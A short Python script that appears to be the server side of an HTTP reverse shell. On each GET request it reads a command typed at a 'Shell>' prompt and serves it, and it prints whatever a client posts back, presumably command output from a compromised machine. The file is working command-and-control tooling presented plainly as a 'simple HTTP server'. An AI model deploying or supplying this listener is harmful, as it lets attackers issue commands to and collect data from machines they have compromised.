import http.server
import socketserver
import sys
import argparse

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        command = input("Shell> ")  # Taking user input
        self.send_response(200)  # Sending 200 OK Response
        self.send_header("Content-type", "text/html")  # Setting Content Type
        self.end_headers()  # End of Headers
        self.wfile.write(command.encode("utf-8"))  # Send command as bytes

    def do_POST(self):
        self.send_response(200)  # Sending 200 OK Response
        self.end_headers()  # End of headers
        content_length = int(self.headers["Content-Length"])  # Getting content length
        post_data = self.rfile.read(content_length)  # Read data of response
        print(post_data.decode("utf-8"))  # Print the posted data as a string

def run_server(host_name, host_port):
    with socketserver.TCPServer((host_name, host_port), MyHandler) as httpd:
        print(f"Server started at http://{host_name}:{host_port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            sys.stderr.write("[!] Server Terminated\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple HTTP Server with Command Input")
    parser.add_argument('host', default='127.0.0.1', help='Host to bind the server (default: 127.0.0.1)')
    parser.add_argument('port', type=int, default=9999, help='Port to bind the server (default: 9999)')
    
    args = parser.parse_args()

    run_server(args.host, args.port)
